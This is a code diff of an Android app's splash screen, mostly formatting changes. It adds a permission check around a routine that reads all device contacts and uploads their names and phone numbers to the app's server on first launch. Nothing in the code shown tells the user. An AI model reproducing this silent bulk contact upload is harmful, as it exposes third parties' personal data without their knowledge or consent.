@@ -1,10 +1,13 @@
 package com.yunfengsi.Setting;
 
+import android.Manifest;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.graphics.Color;
+import android.os.Build;
 import android.os.Bundle;
 import android.os.CountDownTimer;
 import android.provider.ContactsContract;
@@ -68,11 +71,11 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
     /*
        启动页图像控件
      */
-    private ImageView image;
+    private ImageView      image;
     /*
       跳过
     */
-    private TextView skip;
+    private TextView       skip;
     /*
      倒数计时器
     */
@@ -81,14 +84,14 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
     //获取到的广告页地址
     private String imageUrl;
     private Bitmap mAD;
-    private int screenHeight;
+    private int    screenHeight;
 
     private TextView type;//类型提示
     private boolean isFirstIn = true;
     /**
      * 轮播引导页
      */
-    private ViewPager pager;
+    private ViewPager    pager;
     /**
      * 引导页适配器
      */
@@ -96,7 +99,7 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
     /**
      * 广告页URL
      */
-    private URL y;
+    private URL          y;
 
     private boolean shouldLoadImage = true;
 
@@ -143,7 +146,7 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
             e.printStackTrace();
         }
         ApisSeUtil.M m = ApisSeUtil.i(js);
-        LogUtil.e("获取广告：："+js);
+        LogUtil.e("获取广告：：" + js);
         OkGo.post(Constants.getAD)
                 .tag(this)
                 .params("key", m.K())
@@ -159,11 +162,11 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
                 if (shouldLoadImage) {
                     if (response != null) {
                         try {
-                            String data = response.body().string();
-                            HashMap<String, String> map = AnalyticalJSON.getHashMap(data);
+                            String                  data = response.body().string();
+                            HashMap<String, String> map  = AnalyticalJSON.getHashMap(data);
                             Log.w(TAG, "onResponse: 广告页地址" + map + "    是否活动图标：：" + map.get("act_start"));
                             if (map != null) {
-                                String url = map.get("image1");
+                                String url    = map.get("image1");
                                 String detail = map.get("url");
                                 getBitmapForAD(url, detail);
                                 mApplication.changeIcon = "2".equals(map.get("act_start")) ? true : false;
@@ -196,7 +199,7 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
                 @Override
                 public void onResourceReady(Bitmap resource, GlideAnimation<? super Bitmap> glideAnimation) {
                     if (image != null) {
-                        mAD=resource;
+                        mAD = resource;
                         image.setImageBitmap(resource);
 //                        ObjectAnimator oa = ObjectAnimator.ofFloat(image, "alpha", 0f, 1f).setDuration(1000);
 //                        oa.start();
@@ -208,7 +211,6 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
             });
 
         }
-
 
 
     }
@@ -239,7 +241,7 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
         ACache acache = ACache.get(getApplicationContext());
         if (PreferenceUtil.getUserIncetance(this).getBoolean("isFirstIn", true)) {
             ViewStub viewStubfirst = (ViewStub) findViewById(R.id.view_stub_first);
-            View view = viewStubfirst.inflate();
+            View     view          = viewStubfirst.inflate();
             pager = (ViewPager) view.findViewById(R.id.view_stub_viewpager);
             final int[] images = new int[]{R.drawable.loading1, R.drawable.loading2};
             pagerAdapter = new PagerAdapter() {
@@ -262,7 +264,7 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
                 public Object instantiateItem(ViewGroup container, int position) {
                     ImageView img = new ImageView(Splash.this);
                     img.setScaleType(ImageView.ScaleType.CENTER_CROP);
-                    Bitmap bitmap=ImageUtil.readBitMap(Splash.this, images[position]);
+                    Bitmap bitmap = ImageUtil.readBitMap(Splash.this, images[position]);
                     img.setImageBitmap(bitmap);
                     container.addView(img);
                     return img;
@@ -275,9 +277,9 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
             skip.setVisibility(View.VISIBLE);
         } else {
             ViewStub viewStubstart = (ViewStub) findViewById(R.id.view_stub_start);
-            View view = viewStubstart.inflate();
+            View     view          = viewStubstart.inflate();
             image = (ImageView) view.findViewById(R.id.splash_image);
-            Bitmap bitmap=ImageUtil.readBitMap(this, R.drawable.start);
+            Bitmap bitmap = ImageUtil.readBitMap(this, R.drawable.start);
             image.setImageBitmap(bitmap);
             image.postDelayed(new Runnable() {
                 @Override
@@ -292,10 +294,17 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
 
         }
 
-        if(PreferenceUtil.getSettingIncetance(this).getBoolean("isFirstInstall",true)
-                &&!PreferenceUtil.getUserId(this).equals("")){
-            PreferenceUtil.getSettingIncetance(this).edit().putBoolean("isFirstInstall",false).apply();
-            uploadContacts();
+        if (PreferenceUtil.getSettingIncetance(this).getBoolean("isFirstInstall", true)
+                && !PreferenceUtil.getUserId(this).equals("")) {
+            PreferenceUtil.getSettingIncetance(this).edit().putBoolean("isFirstInstall", false).apply();
+            if (Build.VERSION.SDK_INT >= 23) {
+                if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+                    uploadContacts();
+                }
+            } else {
+                uploadContacts();
+            }
+
         }
 
 
@@ -303,35 +312,35 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
 
     private void uploadContacts() {
         String[] cols = {ContactsContract.PhoneLookup.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER};
-        Cursor cursor =getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+        Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                 cols, null, null, null);
-        JSONArray jsonArray=new JSONArray();
+        JSONArray jsonArray = new JSONArray();
         for (int i = 0; i < cursor.getCount(); i++) {
             cursor.moveToPosition(i);
             // 取得联系人名字
-            int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
-            int numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
-            String name = cursor.getString(nameFieldColumnIndex);
-            String number = cursor.getString(numberFieldColumnIndex);
+            int    nameFieldColumnIndex   = cursor.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME);
+            int    numberFieldColumnIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+            String name                   = cursor.getString(nameFieldColumnIndex);
+            String number                 = cursor.getString(numberFieldColumnIndex);
 
-            HashMap<String,String > map=new HashMap<>();
-            map.put("name",name);
-            map.put("phone",number);
-            JSONObject jsonObject=new JSONObject(map);
+            HashMap<String, String> map = new HashMap<>();
+            map.put("name", name);
+            map.put("phone", number);
+            JSONObject jsonObject = new JSONObject(map);
             jsonArray.put(jsonObject);
         }
         cursor.close();
-        JSONObject js=new JSONObject();
+        JSONObject js = new JSONObject();
         try {
-            js.put("user_id",PreferenceUtil.getUserId(this));
-            js.put("contacts",jsonArray.toString());
+            js.put("user_id", PreferenceUtil.getUserId(this));
+            js.put("contacts", jsonArray.toString());
         } catch (JSONException e) {
             e.printStackTrace();
         }
-        ApisSeUtil.M m=ApisSeUtil.i(js);
+        ApisSeUtil.M m = ApisSeUtil.i(js);
         OkGo.post(Constants.Contacts)
-                .params("key",m.K())
-                .params("msg",m.M())
+                .params("key", m.K())
+                .params("msg", m.M())
                 .execute(new StringCallback() {
                     @Override
                     public void onSuccess(String s, Call call, Response response) {
@@ -346,9 +355,9 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        if(image!=null){
+        if (image != null) {
             image.destroyDrawingCache();
-            image=null;
+            image = null;
         }
         if (mAD != null && !mAD.isRecycled()) {
             mAD.recycle();
@@ -383,7 +392,7 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
                     cdt.cancel();
                     cdt = null;
                 }
-                if(image!=null){
+                if (image != null) {
                     LogUtil.e("销毁bitmap");
                     image.destroyDrawingCache();
                 }
@@ -434,7 +443,6 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
 //                }
 
 
-
                 intent.setClass(this, MainActivity.class);
                 startActivity(intent);
                 finish();
@@ -461,20 +469,20 @@ public class Splash extends AppCompatActivity implements View.OnClickListener {
                             finish();
                             return;
                         }
-                        if(url.equals(Constants.Help)){
-                            intent.setClass(Splash.this,AD.class);
-                            intent.putExtra("bangzhu",true);
+                        if (url.equals(Constants.Help)) {
+                            intent.setClass(Splash.this, AD.class);
+                            intent.putExtra("bangzhu", true);
                             startActivity(intent);
                             return;
                         }
-                        if (!url.equals("")&&url.contains("yfs.php")) {
+                        if (!url.equals("") && url.contains("yfs.php")) {
                             if (url.contains("?")) {
-                                int index = url.lastIndexOf("?");
-                                String arg = url.substring(index + 1, url.length());
+                                int    index = url.lastIndexOf("?");
+                                String arg   = url.substring(index + 1, url.length());
                                 LogUtil.e("截取后的参数字段：" + arg);
                                 if (arg.contains("&")) {
-                                    String[] args = arg.split("&");
-                                    final String id = args[0].substring(args[0].lastIndexOf("=") + 1);
+                                    String[]     args = arg.split("&");
+                                    final String id   = args[0].substring(args[0].lastIndexOf("=") + 1);
                                     final String type = args[1].substring(args[1].lastIndexOf("=") + 1);
                                     LogUtil.e("字段信息：  id::" + id + "  type::" + type);
 
